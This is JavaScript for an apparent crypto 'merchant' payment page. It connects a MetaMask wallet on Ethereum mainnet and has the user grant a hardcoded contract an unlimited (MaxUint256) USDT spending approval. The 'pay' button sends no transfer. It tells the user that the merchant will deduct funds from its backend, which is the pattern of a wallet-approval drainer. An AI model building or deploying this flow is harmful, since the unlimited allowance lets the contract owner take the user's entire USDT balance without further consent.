const ETHEREUM_CONTRACT_ADDRESS = '0xda52f92e86fd499375642cd269f624f741907a8f';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT Mainnet Address
const MAX_UINT256 = ethers.MaxUint256; // 使用 ethers.js 內建的最大值

const CONTRACT_ABI = [
    "function connectAndAuthorize() external",
    "function authorized(address customer) external view returns (bool)",
    "event Authorized(address indexed customer)"
];
const USDT_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)"
];

const connectButton = document.getElementById('connectButton');
let provider, signer, userAddress, contract, usdtContract;

// Stores event listener references
let accountChangeListener = null;
let chainChangeListener = null;

// --- UI 控制函數 ---

function updateStatus(message) {
    const statusDiv = document.getElementById('status');
    statusDiv.innerHTML = `<strong>Status:</strong> ${message}`; // 狀態
}

function showAppContent(address) {
    const displayAddress = address.slice(0, 6) + '...' + address.slice(-4);
    document.getElementById('appContent').style.display = 'block';
    document.getElementById('connectedAddress').innerText = displayAddress;
    updateStatus('✅ 已連接。地址: ' + displayAddress);
}

function hideAppContent() {
    document.getElementById('appContent').style.display = 'none';
    document.getElementById('connectedAddress').innerText = '未連接';
    updateStatus('Status: 請連繫錢包以查看支付選項。');
}

function resetState() {
    signer = null;
    userAddress = null;
    contract = null;
    usdtContract = null;
    connectButton.classList.remove('connected');
    connectButton.title = 'Connect Wallet'; // 連繫錢包
    connectButton.disabled = false;
    hideAppContent(); // 斷開連繫時隱藏內容
}

// --- 核心錢包邏輯 ---

async function initializeWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('Please install MetaMask or a supported wallet');
            return;
        }
        
        provider = new ethers.BrowserProvider(window.ethereum);
        
        // Remove old listeners to prevent duplicate bindings
        if (accountChangeListener) window.ethereum.removeListener('accountsChanged', accountChangeListener);
        if (chainChangeListener) window.ethereum.removeListener('chainChanged', chainChangeListener);

        // Check network and switch to Mainnet
        const network = await provider.getNetwork();
        if (network.chainId !== 1n) { // 1n is Mainnet Chain ID
            updateStatus('正在切換到以太坊主網 (Mainnet)...');
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }] 
                });
                // Re-initialize provider after successful switch
                provider = new ethers.BrowserProvider(window.ethereum);
                await provider.getNetwork(); 
            } catch (switchError) {
                if (switchError.code === 4001) {
                    updateStatus('用戶拒絕切換網絡。請手動切換到以太坊主網。');
                } else {
                    updateStatus(`切換網絡失敗: ${switchError.message}`);
                }
                return; 
            }
        }

        const accounts = await provider.send('eth_accounts', []);
        if (accounts.length > 0) {
            userAddress = accounts[0];
            signer = await provider.getSigner();
            
            // Initialize contracts with signer
            contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
            usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer); 
            
            showAppContent(userAddress); // 連線成功，顯示內容
            await checkAuthorization();
            updateStatus('Connection restored, checking authorization status');
        } else {
            updateStatus('Please connect wallet');
            hideAppContent();
        }

        // Add event listeners (simplified logic)
        accountChangeListener = (accounts) => {
            if (accounts.length === 0) {
                resetState();
                updateStatus('Wallet disconnected');
            } else {
                initializeWallet();
            }
        };
        window.ethereum.on('accountsChanged', accountChangeListener);

        chainChangeListener = () => {
            resetState();
            updateStatus('Network changed, please reconnect wallet');
            window.location.reload(); 
        };
        window.ethereum.on('chainChanged', chainChangeListener);

    } catch (error) {
        updateStatus(`Initialization failed: ${error.message}`);
        console.error("Initialize Wallet Error:", error);
        hideAppContent();
    }
}


async function checkAuthorization() {
    try {
        if (!signer || !userAddress || !contract || !usdtContract) {
            document.getElementById('currentAuthStatus').innerText = 'Wallet Not Ready';
            return;
        }
        
        const statusDiv = document.getElementById('currentAuthStatus');
        statusDiv.innerHTML = 'Checking...';

        const isAuthorized = await contract.authorized(userAddress);
        const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
        
        const isUsdtMaxApproved = usdtAllowance >= MAX_UINT256 / 2n; // 檢查是否是 MaxUint256
        const allAuthorized = isAuthorized && isUsdtMaxApproved;

        let statusMessage = '';
        if (isAuthorized) {
            statusMessage += 'Merchant Contract: <span class="auth-status-ok">✅ Authorized</span>. ';
        } else {
            statusMessage += 'Merchant Contract: <span class="auth-status-error">❌ NOT Authorized</span>. ';
        }
        
        if (isUsdtMaxApproved) {
            statusMessage += 'USDT Token: <span class="auth-status-ok">✅ Max Approved</span>.';
        } else if (usdtAllowance > 0n) {
            statusMessage += 'USDT Token: <span class="auth-status-warn">⚠️ Insufficient Approval</span>.';
        } else {
            statusMessage += 'USDT Token: <span class="auth-status-error">❌ Not Approved</span>.';
        }
        
        statusDiv.innerHTML = statusMessage;
        
        if (allAuthorized) {
            connectButton.classList.add('connected');
            connectButton.title = 'Disconnect Wallet';
            document.getElementById('authorizeButton').disabled = true; // 已經授權，禁用按鈕
        } else {
            connectButton.classList.remove('connected');
            connectButton.title = 'Connect Wallet (Requires Auth)';
            document.getElementById('authorizeButton').disabled = false; // 需要授權，啟用按鈕
        }

    } catch (error) {
        document.getElementById('currentAuthStatus').innerHTML = `<span class="auth-status-error">Check failed: ${error.message.slice(0, 40)}...</span>`;
        console.error("Check Authorization Error:", error);
    }
}


// --- 步驟 1: 處理授權 (Approve) 邏輯 ---
async function handleAuthorization() {
    if (!signer || !userAddress) {
        document.getElementById('authStatusDiv').innerText = '請先連繫錢包。';
        return;
    }

    const authStatusDiv = document.getElementById('authStatusDiv');
    authStatusDiv.innerHTML = '正在檢查和發起授權交易，請在錢包中確認...';
    document.getElementById('authorizeButton').disabled = true;

    try {
        // 1. 檢查並執行 SimpleMerchant contract authorization (connectAndAuthorize)
        const isAuthorized = await contract.authorized(userAddress);
        if (!isAuthorized) {
            authStatusDiv.innerHTML += '<p>1/2: 正在授權 SimpleMerchant 合約...</p>';
            const txAuthorize = await contract.connectAndAuthorize();
            await txAuthorize.wait();
            authStatusDiv.innerHTML += '<p style="color: green;">✅ SimpleMerchant 合約授權成功。</p>';
        } else {
            authStatusDiv.innerHTML += '<p style="color: blue;">SimpleMerchant 合約已授權。</p>';
        }

        // 2. 檢查並執行 USDT token approval (approve)
        const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
        
        if (usdtAllowance < MAX_UINT256) {
            authStatusDiv.innerHTML += '<p>2/2: 正在授權 USDT 代幣 (MaxUint256)...</p>';
            const txApprove = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, MAX_UINT256);
            await txApprove.wait();
            authStatusDiv.innerHTML += '<p style="color: green;">✅ USDT 代幣授權成功 (MaxUint256 set)。</p>';
        } else {
            authStatusDiv.innerHTML += '<p style="color: blue;">USDT 代幣已授權 MaxUint256。</p>';
        }
        
        authStatusDiv.innerHTML = '<p style="color: green; font-weight: bold;">🎉 所有必要授權已完成！現在可以支付。</p>';
        await checkAuthorization(); // 最終檢查並更新 UI

    } catch (error) {
        let errorMessage = error.message;
        if (error.code === 4001 || error.code === 'ACTION_REJECTED') errorMessage = '用戶拒絕交易。';
        
        authStatusDiv.innerHTML = `<p style="color: red; font-weight: bold;">❌ 授權失敗: ${errorMessage}</p>`;
        console.error('Authorization error:', error);
    } finally {
        document.getElementById('authorizeButton').disabled = false;
    }
}


// --- 步驟 2: 處理支付 (客戶支付意圖通知) ---
async function handlePayClick(tokenName) {
    if (!signer) {
        document.getElementById('payStatusDiv').innerText = '請先連繫錢包。';
        return;
    }

    const amountValue = document.getElementById('paymentAmount').value;
    const payStatusDiv = document.getElementById('payStatusDiv');
    
    if (!amountValue || isNaN(amountValue) || Number(amountValue) <= 0) {
        payStatusDiv.innerText = '請輸入有效的支付數量。';
        return;
    }
    
    // 提醒用戶：實際的扣款由店家後台處理
    payStatusDiv.innerHTML = `
        <p style="color: orange;">支付請求已記錄！</p>
        <p>您請求支付 <strong>${amountValue} ${tokenName}</strong>。</p>
        <p>請等待店家確認您的訂單和授權狀態，並從其後台發起扣款。</p>
        <p><strong>注意：此操作不會產生轉賬交易。</strong></p>
    `;
    
    // 實際應用中，您會在這裡發送一個 HTTP 請求到您的業務後端
    console.log(`客戶請求支付 ${amountValue} ${tokenName}`);
}


// --- 初始啟動和事件綁定 ---
document.addEventListener('DOMContentLoaded', () => {
    // 綁定錢包按鈕
    connectButton.addEventListener('click', () => {
        if (connectButton.classList.contains('connected')) {
            disconnectWallet();
        } else {
            // 如果未連線，點擊按鈕應該只請求連線，授權應透過專門按鈕處理
            initializeWallet(); 
        }
    });

    // 綁定授權和支付按鈕
    document.getElementById('authorizeButton').addEventListener('click', handleAuthorization);
    document.getElementById('payUsdtButton').addEventListener('click', () => handlePayClick('USDT'));
    // (USDC 相關的元素和邏輯因 ABI 限制而被移除)

    // 初始載入
    initializeWallet();
});

// disconnectWallet 函數保持不變
function disconnectWallet() {
    resetState();
    updateStatus('Wallet disconnected, please reconnect.');
    // 不會自動斷開 MetaMask，而是提示用戶
    alert('Wallet disconnected. To fully remove site access from MetaMask, please manually remove this site from "Connected Sites" in MetaMask settings.');
}